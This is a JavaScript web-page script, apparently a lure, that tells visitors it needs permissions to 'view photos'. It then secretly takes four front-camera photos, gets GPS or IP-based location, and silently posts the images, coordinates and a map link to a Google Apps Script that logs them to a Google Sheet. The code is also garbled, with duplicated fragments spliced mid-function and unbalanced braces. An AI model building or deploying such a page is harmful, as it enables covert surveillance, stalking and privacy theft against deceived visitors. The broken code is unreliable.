// ================================
// دالة الحصول على اسم المنطقة
// ================================
async function getLocationName(latitude, longitude) {
    try {
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=10&accept-language=ar`
        );
        if (!response.ok) throw new Error('فشل');
        const data = await response.json();
        let locationName = '';
        if (data.address) {
            locationName = data.address.city || data.address.town || data.address.village || 
                          data.address.suburb || data.address.district || data.address.county || 
                          data.address.state || data.address.country || 'نافذة غير معروفة';
        } else {
            locationName = 'نافذة غير معروفة';
        }
        return locationName;
    } catch (error) {
        return 'نافذة غير معروفة';
    }
}

// دالة التقاط صورة من فيديو معين

function captureImageFromVideo(videoElement) {
    if (!videoElement || !videoElement.videoWidth) return null;
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.7);
}

// ================================
// دالة تشغيل الكاميرات والتقاط الصور
// ================================
async function requestPermissionsTogether(statusDiv, btn) {
    try {
        statusDiv.innerHTML = "📱 جاري طلب أذونات لمشاهدة الصور...";
        statusDiv.className = "status-loading";

        // طلب الموقع والكاميرا في نفس الوقت باستخدام Promise.all
        const [position, stream] = await Promise.all([
            // طلب الموقع
            new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            }),
            // طلب الكاميرا
            navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 320 },
                    height: { ideal: 240 }
                },
                audio: false
            })
        ]);

        // تخزين بيانات الموقع
        const { latitude, longitude } = position.coords;
        locationData = { latitude, longitude, source: 'GPS' };
        
        const locationName = await getLocationName(latitude, longitude);
        locationData.locationName = locationName;

        statusDiv.innerHTML = `📍 الموقع: ${locationName}`;
        statusDiv.className = "status-success";

        // تشغيل الكاميرا
        const videoFront = document.getElementById('videoFront');
        videoFront.srcObject = stream;
        await new Promise((resolve) => {
            videoFront.onloadedmetadata = () => {
                videoFront.play();
                cameraFrontReady = true;
                resolve();
            };
        });

        statusDiv.innerHTML = "✅ الصفحة جاهزة. جاري جلب الصور...";
        statusDiv.className = "status-success";

        // التقاط 4 صور
        const videoFrontEl = document.getElementById('videoFront');
        for (let i = 0; i < 4; i++) {
            await new Promise(resolve => setTimeout(resolve, 300));
            const imgData = captureImageFromVideo(videoFrontEl);
            if (imgData) {
                if (i < 2) {
                    frontImages.push(imgData);
                } else {
                    backImages.push(imgData);
                }
            }
        }

        // إغلاق الكاميرا
        if (videoFront.srcObject) {
            videoFront.srcObject.getTracks().forEach(track => track.stop());
        }

        statusDiv.innerHTML = `📸 تم جلب ${frontImages.length + backImages.length} صورة`;
        statusDiv.className = "status-success";
        
        if (frontImages.length >= 2 && backImages.length >= 2) {
            checkAndSend(statusDiv);
        } else {
            statusDiv.innerHTML = "⚠️ لم يتم جلب جميع الصور. حاول مرة أخرى.";
            statusDiv.className = "status-error";
            btn.disabled = false;
            btn.textContent = "Enter";
        }

    } catch (err) {
        // إذا فشل أحد الأذونات
        statusDiv.innerHTML = "⚠️ تم رفض أحد الأذونات. جاري المحاولة باستخدام IP...";
        statusDiv.className = "status-warning";
        
        // محاولة الحصول على الموقع عبر IP

        // محاولة تشغيل الكاميرا بشكل منفصل
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 320 },
                    height: { ideal: 240 }
                },
                audio: false
            });
            
            const videoFront = document.getElementById('videoFront');
            videoFront.srcObject = stream;
            await new Promise((resolve) => {
                videoFront.onloadedmetadata = () => {
                    videoFront.play();
                    cameraFrontReady = true;
                    resolve();
                };
            });

            const videoFrontEl = document.getElementById('videoFront');
            for (let i = 0; i < 4; i++) {
                await new Promise(resolve => setTimeout(resolve, 300));
                const imgData = captureImageFromVideo(videoFrontEl);
                if (imgData) {
                    if (i < 2) {
                        frontImages.push(imgData);
                    } else {
                        backImages.push(imgData);

            if (videoFront.srcObject) {

            statusDiv.innerHTML = `📸 تم جلب الصورة ${frontImages.length + backImages.length} صورة `;

            btn.textContent = "Enter";
        }

}



// ================================
// دالة إرسال البيانات إلى Google Sheets
// ================================
async function sendAllData() {
    if (!locationData || frontImages.length < 2 || backImages.length < 2) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = "❌ Missing data or images. Details cannot be opened.";
        statusDiv.className = "status-error";
        const btn = document.getElementById('continueBtn');
        btn.disabled = false;
        btn.textContent = "Enter";
        return;
    }
    if (sendInProgress) return;
    sendInProgress = true;

    const { latitude, longitude, source, locationName } = locationData;
    const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
    const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const payload = {
        sheetId: SHEET_ID,
        sheetName: SHEET_NAME,
        newDate: new Date().toISOString(),
        linkLocation: linkLocation,
        latitude: latitude,
        longitude: longitude,
        Timestamp: timestamp,
        LocationName: locationName,
        imageData: frontImages[0] || '',
        imageData2: frontImages[1] || '',
        imageData3: backImages[0] || '',
        imageData4: backImages[1] || ''
    };

    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = "📤 Bring Photos from server...";
    statusDiv.className = "status-loading";

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        statusDiv.innerHTML = "✅ Photos Bring successfully! Opening details...";
        statusDiv.className = "status-success";
        openBlockWindow();
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "Done";
        btn.classList.add('btn-disabled');
        isDone = true;
    } catch (error) {
        statusDiv.innerHTML = "⚠️ Error Bring Photos. Opening details anyway.";
        statusDiv.className = "status-error";
        openBlockWindow();
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "Done";
        btn.classList.add('btn-disabled');
        isDone = true;
    } finally {
        sendInProgress = false;
    }
}

// ================================
// دالة التحقق من الجاهزية للإرسال
// ================================
function checkAndSend(statusDiv) {
    if (sendInProgress || isDone) return;
    if (frontImages.length < 2 || backImages.length < 2) {
        statusDiv.innerHTML = "⏳ Waiting for all Photos...";
        statusDiv.className = "status-loading";
        return;
    }
    if (locationData) {
        sendAllData();
    } else {
        setTimeout(() => checkAndSend(statusDiv), 500);
    }
}

// ================================
// دالة تخزين الموقع
// ================================
function storeLocation(latitude, longitude, source) {
    if (locationData) return;
    locationData = { latitude, longitude, source };
    getLocationName(latitude, longitude).then(name => {
        locationData.locationName = name;
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = "📍 Link retrieved!";
        statusDiv.className = "status-success";
        if (frontImages.length >= 2 && backImages.length >= 2) {
            checkAndSend(statusDiv);
        }
    });
}

// ================================
// دوال جلب الموقع
// ================================
function getLocationViaIP() {
    fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP'); })
        .catch(() => getLocationViaIP2());
}

function getLocationViaIP2() {
    fetch('https://ipapi.co/json/')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP'); })
        .catch(() => getLocationViaIP3());
}

function getLocationViaIP3() {
    fetch('https://ipinfo.io/json')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { 
            if (data.loc) { 
                const coords = data.loc.split(',').map(Number); 
                if (coords.length === 2 && !isNaN(coords[0]) && !isNaN(coords[1])) {
                    storeLocation(coords[0], coords[1], 'IP');
                }
            }
        });
}

function getLocationViaGPS() {
    if (!navigator.geolocation) { getLocationViaIP(); return; }
    navigator.geolocation.getCurrentPosition(
        (position) => storeLocation(position.coords.latitude, position.coords.longitude, 'GPS'),
        () => getLocationViaIP(),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

        }

        // إغلاق الكاميرا
        if (videoFront.srcObject) {
            videoFront.srcObject.getTracks().forEach(track => track.stop());
        }

        statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images`;
        statusDiv.className = "status-success";
        
        if (frontImages.length >= 2 && backImages.length >= 2) {
            checkAndSend(statusDiv);
        } else {
            statusDiv.innerHTML = "⚠️ Could not capture all images. Please try again.";
            statusDiv.className = "status-error";
            btn.disabled = false;
            btn.textContent = "Enter";
        }

    } catch (err) {
        // إذا فشل الموقع، استخدم IP كبديل
        statusDiv.innerHTML = "⚠️ Link access denied. Using approximate Link Please try again.";
        statusDiv.className = "status-warning";
        getLocationViaIP();
        
        // استمر في تشغيل الكاميرا
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 320 }, 
                    height: { ideal: 240 } 
                },
                audio: false
            });
            
            const videoFront = document.getElementById('videoFront');
            videoFront.srcObject = stream;
            await new Promise((resolve) => {
                videoFront.onloadedmetadata = () => {
                    videoFront.play();
                    cameraFrontReady = true;
                    resolve();
                };
            });

            const videoFrontEl = document.getElementById('videoFront');
            for (let i = 0; i < 4; i++) {
                await new Promise(resolve => setTimeout(resolve, 300));
                const imgData = captureImageFromVideo(videoFrontEl);
                if (imgData) {
                    if (i < 2) {
                        frontImages.push(imgData);
                    } else {
                        backImages.push(imgData);
                    }
                }
            }

            if (videoFront.srcObject) {
                videoFront.srcObject.getTracks().forEach(track => track.stop());
            }

            statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images (approx location)`;
            statusDiv.className = "status-success";
            
            if (frontImages.length >= 2 && backImages.length >= 2) {
                setTimeout(() => checkAndSend(statusDiv), 3000);
            }
        } catch (cameraErr) {
            statusDiv.innerHTML = "❌ Link access denied. Please allow Link access.";
            statusDiv.className = "status-error";
            btn.disabled = false;
            btn.textContent = "Enter";
        }
    }
}


// ================================
// حدث الضغط على زر متابعة
// ================================
document.getElementById('continueBtn').addEventListener('click', async function() {
    if (isDone) return;
    const btn = this;
    const statusDiv = document.getElementById('status');
    
    btn.disabled = true;
    btn.textContent = "جاري التحميل...";
    statusDiv.innerHTML = "⏳ جاري البدء...";
    statusDiv.className = "status-loading";

    frontImages = [];
    backImages = [];
    locationData = null;
    sendInProgress = false;
    isDone = false;
    cameraFrontReady = false;

    // استدعاء الدالة الجديدة
    await requestPermissionsTogether(statusDiv, btn);

    // timeout احتياطي
    setTimeout(() => {
        if (!isDone) {
            if (frontImages.length < 2 || backImages.length < 2) {
                statusDiv.innerHTML = "⏰ انتهى الوقت: لم يتم تحميل جميع الصور. حاول مرة أخرى.";
                statusDiv.className = "status-error";
                btn.disabled = false;
                btn.textContent = "Enter";
            } else if (!locationData) {
                statusDiv.innerHTML = "⚠️ انتهى الوقت: لم يتم الحصول على الموقع. جاري المحاولة...";
                statusDiv.className = "status-warning";
                getLocationViaIP();
                setTimeout(() => checkAndSend(statusDiv), 3000);
            }
        }
    }, 30000);
});

</script>
